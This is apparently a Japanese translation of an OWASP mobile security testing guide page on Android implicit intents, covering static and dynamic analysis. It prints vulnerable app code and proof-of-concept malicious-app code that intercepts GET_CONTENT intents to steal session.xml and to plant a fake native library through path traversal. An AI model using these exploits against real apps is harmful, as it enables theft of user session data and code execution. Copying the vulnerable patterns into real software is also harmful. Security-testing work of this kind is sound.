---
masvs_v1_id:
- MSTG-PLATFORM-2
masvs_v2_id:
- MASVS-CODE-4
platform: android
title: 暗黙的インテントのテスト (Testing Implicit Intents)
masvs_v1_levels:
- L1
- L2
---

## 概要

[暗黙的インテント](../../../Document/0x05h-Testing-Platform-Interaction.md#implicit-intents) をテストする際には、それらがインジェクション攻撃に対して脆弱であったり、機密データが漏洩する可能性があるかどうかをチェックする必要があります。

## 静的解析

Android Manifest を調べて、[<queries> ブロック](https://developer.android.com/guide/topics/manifest/queries-element "Android queries") 内で定義されている `<intent>` シグネチャ (アプリがやり取りする他のアプリのセットを指定) を探し、システムアクション (`android.intent.action.GET_CONTENT`, `android.intent.action.PICK`, `android.media.action.IMAGE_CAPTURE`, など) が含まれるかどうかをチェックし、それが出現するソースコードを閲覧します。

たとえば、以下の `Intent` は具体的なコンポーネントを指定しておらず、暗黙的インテントであることを意味しています。ユーザーに入力データを尋ねるために `android.intent.action.GET_CONTENT` アクションを設定し、アプリは `startActivityForResult` と画像選択を指定してインテントを開始します。

```java
Intent intent = new Intent();
intent.setAction("android.intent.action.GET_CONTENT");
startActivityForResult(Intent.createChooser(intent, ""), REQUEST_IMAGE);
```

アプリは `startActivity` の代わりに `startActivityForResult` を使用し、結果 (この場合は画像) を期待していることを示しており、 `onActivityResult` コールバックを探してインテントの戻り値がどのように処理されるかをチェックする必要があります。インテントの戻り値が適切に検証されていない場合、攻撃者はアプリの内部ストレージ `/data/data/<appname>` から任意のファイルを読み取ったり、任意のコードを実行できる可能性があります。この種の攻撃の詳しい説明は [次のブログ記事](https://blog.oversecured.com/Interception-of-Android-implicit-intents " Current attacks on implicit intents") にあります。

### Case 1: 任意のファイルの読み取り

この例では、インテントの返り値の不適切な検証によって、攻撃者がどのようにしてアプリの内部ストレージ `/data/data/<appname>` 内から任意のファイルを読み取ることができるかを見ていきます。

以下の例の `performAction` メソッドは暗黙的インテントの戻り値を読み取ります。これは攻撃者が提供した URI である可能性があり、それを `getFileItemFromUri` に渡します。このメソッドはファイルを一時フォルダにコピーします。これはこのファイルが内部的に表示される場合に通常行われます。しかし、アプリが `getExternalCacheDir` や `getExternalFilesDir` を呼び出すなどして、URI で提供されたファイルを外部の一時ディレクトリに保存する場合、攻撃者は `android.permission.READ_EXTERNAL_STORAGE` パーミッションを設定した後でこのファイルを読み取ることができます。

```java
private void performAction(Action action){
  ...
  Uri data = intent.getData();
  if (!(data == null || (fileItemFromUri = getFileItemFromUri(data)) == null)) {
      ...
  }
}

private FileItem getFileItemFromUri(Context, context, Uri uri){
  String fileName = UriExtensions.getFileName(uri, context);
  File file = new File(getExternalCacheDir(), "tmp");
  file.createNewFile();
  copy(context.openInputStream(uri), new FileOutputStream(file));
  ...
}
```

以下は上記の脆弱なコードを悪用する悪意のあるアプリのソースです。

AndroidManifest.xml

```xml
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<application>
  <activity android:name=".EvilContentActivity">
      <intent-filter android:priority="999">
          <action android:name="android.intent.action.GET_CONTENT" />
          <data android:mimeType="*/*" />
      </intent-filter>
  </activity>
</application>
```

EvilContentActivity.java

```java
public class EvilContentActivity extends Activity{
  @Override
  protected void OnCreate(@Nullable Bundle savedInstanceState){
    super.OnCreate(savedInstanceState);
    setResult(-1, new Intent().setData(Uri.parse("file:///data/data/<victim_app>/shared_preferences/session.xml")));
    finish();
  }
}
```

ユーザーがインテントを処理するために悪意のあるアプリを選択した場合、攻撃者はアプリの内部ストレージから `session.xml` を盗むことができます。前の例では、被害者はダイアログで攻撃者の悪意のあるアプリを明示的に選択する必要があります。しかし、開発者はこのダイアログを抑制し、インテントの受信者を自動的に決定することもできます。これによりユーザーとの追加のやり取りなしで攻撃が発生する可能性があります。

以下のコードサンプルは受信者の自動選択を実装します。悪意のあるアプリのインテントフィルタに優先度を指定することで、攻撃者は選択シーケンスに影響を与えることができます。

```java
Intent intent = new Intent("android.intent.action.GET_CONTENT");
for(ResolveInfo info : getPackageManager().queryIntentActivities(intent, 0)) {
    intent.setClassName(info.activityInfo.packageName, info.activityInfo.name);
    startActivityForResult(intent);
    return;
}
```

### Case 2: 任意のコードの実行

被害者アプリが `content://` や `file://` URLを許可している場合、暗黙的インテントの不適切に処理された戻り値によって任意のコードが実行される可能性があります。

攻撃者は `public Cursor query(...)` を含む [`ContentProvider`](https://developer.android.com/reference/android/content/ContentProvider "Android ContentProvider") を実装して、任意のファイル (この場合は _lib.so_) を設定できます。もし被害者が `copy` を実行してコンテンツプロバイダからこのファイルをロードすると、攻撃者の `ParcelFileDescriptor openFile(...)` メソッドが実行され、悪意のある _fakelib.so_ を返します。

AndroidManifest.xml

```xml
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<application>
  <activity android:name=".EvilContentActivity">
      <intent-filter android:priority="999">
          <action android:name="android.intent.action.GET_CONTENT" />
          <data android:mimeType="*/*" />
      </intent-filter>
  </activity>
  <provider android:name=".EvilContentProvider" android:authorities="com.attacker.evil" android:enabled="true" android:exported="true"></provider>
</application>
```

EvilContentProvider.java

```java
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
    matrixCursor.addRow(new Object[]{"../lib-main/lib.so"});
    return matrixCursor;
}
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    return ParcelFileDescriptor.open(new File("/data/data/com.attacker/fakelib.so"), ParcelFileDescriptor.MODE_READ_ONLY);
}
```

EvilContentActivity.java

```java
public class EvilContentActivity extends Activity{
  @Override
  protected void OnCreate(@Nullable Bundle savedInstanceState){
    super.OnCreate(savedInstanceState);
    setResult(-1, new Intent().setData(Uri.parse("content:///data/data/com.attacker/fakelib.so")));
    finish();
  }
}
```

## 動的解析

暗黙的インテントを動的にテストする便利な方法は、特に漏洩の可能性のある機密データを特定するには、Frida または frida-trace を使用して `startActivityForResult` と `onActivityResult` メソッドをフックし、提供されたインテントとそれに含まれるデータを検査することです。
